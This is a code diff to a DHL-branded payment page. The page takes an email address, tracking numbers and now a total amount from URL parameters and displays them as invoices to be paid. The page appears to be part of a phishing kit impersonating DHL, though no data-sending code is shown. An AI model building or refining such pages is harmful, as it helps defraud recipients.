@@ -8,7 +8,15 @@
     <style>
         :root { --dhl-red: #D40511; --dhl-dark: #1a1a1a; }
         * { box-sizing: border-box; }
-        body { background: #f3f6fa; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; color: var(--dhl-dark); }
+        body {
+            background: #f3f6fa;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            color: var(--dhl-dark);
+            overflow-y: auto; /* ensure vertical scroll */
+        }
         .payment-header { background: linear-gradient(135deg, var(--dhl-red) 0%, #b0040e 100%); color: #fff; padding: 1rem 1.5rem; box-shadow: 0 2px 8px rgba(212,5,17,0.2); }
         .payment-header .brand { display: flex; align-items: center; gap: 12px; }
         .payment-header .brand img { height: 38px; filter: brightness(0) invert(1); }
@@ -164,6 +172,8 @@
 
         const email = getQueryParam('email') || '';
         const trackingParam = getQueryParam('tracking') || '';
+        const totalParam = getQueryParam('total'); // NEW: real total from billing page
+
         const trackingNumbers = trackingParam ? trackingParam.split(',').map(s => s.trim()) : [];
 
         document.getElementById('trackingNumbersHidden').value = trackingNumbers.join(',');
@@ -178,8 +188,8 @@
         }
         document.getElementById('invoiceCount').textContent = trackingNumbers.length + ' invoice(s)';
 
-        // Placeholder total
-        const totalUSD = trackingNumbers.length * 50;
+        // Set total from URL param, or fallback to placeholder
+        const totalUSD = totalParam ? parseFloat(totalParam) : (trackingNumbers.length * 50);
         document.getElementById('totalAmount').textContent = '$' + totalUSD.toFixed(2);
 
         // ============================================================
